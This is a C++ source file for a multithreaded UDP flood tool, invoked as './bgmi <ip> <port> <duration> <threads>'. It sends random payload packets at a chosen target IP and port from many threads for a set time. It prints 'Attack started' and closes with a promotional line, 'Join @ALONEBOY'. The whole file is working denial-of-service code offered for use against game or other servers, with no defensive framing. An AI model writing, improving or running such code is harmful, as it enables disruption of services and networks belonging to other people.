#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <memory>
#include <random>
#include <csignal>
#include <unistd.h>

#define PAYLOAD_SIZE 20

// RAII class for handling UDP socket creation and closure
class UDPSocket {
public:
    UDPSocket() {
        sock_ = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock_ < 0) {
            throw std::runtime_error("Socket creation failed");
        }
    }

    ~UDPSocket() {
        if (sock_ >= 0) {
            close(sock_);
        }
    }

    int get() const { return sock_; }

private:
    int sock_;
};

// Class for attack details: target IP, port, duration, and payload generation
class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char* buffer, size_t size) {
        std::random_device rd;
        std::uniform_int_distribution<int> dist(0, 15);
        
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[dist(rd)];
            buffer[i * 4 + 3] = "0123456789abcdef"[dist(rd)];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        try {
            UDPSocket sock;
            struct sockaddr_in server_addr;
            time_t endtime;

            char payload[PAYLOAD_SIZE * 4 + 1];
            generate_payload(payload, PAYLOAD_SIZE);

            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(port);
            server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

            endtime = time(NULL) + duration;
            while (time(NULL) <= endtime) {
                ssize_t payload_size = strlen(payload);
                if (sendto(sock.get(), payload, payload_size, 0, (const struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                    perror("Send failed");
                    return;
                }
            }
        } catch (const std::exception& e) {
            std::cerr << "Error in attack thread: " << e.what() << std::endl;
        }
    }

private:
    std::string ip;
    int port;
    int duration;
};

// Signal handler for graceful shutdown on SIGINT
void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

// Display usage instructions if incorrect arguments are passed
void usage() {
    std::cout << "Usage: ./bgmi <ip> <port> <duration> <threads>\n";
    exit(1);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    // Catching SIGINT (Ctrl+C) for graceful termination
    std::signal(SIGINT, handle_sigint);

    std::vector<std::thread> thread_pool;
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    // Create attack threads
    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        thread_pool.push_back(std::thread([attack = attacks[i].get()]() {
            attack->attack_thread();
        }));
        std::cout << "Launched thread " << i + 1 << "\n";
    }

    // Wait for all threads to finish
    for (auto& t : thread_pool) {
        if (t.joinable()) {
            t.join();
        }
    }

    std::cout << "Attack finished. Join @ALONEBOY\n";
    return 0;
}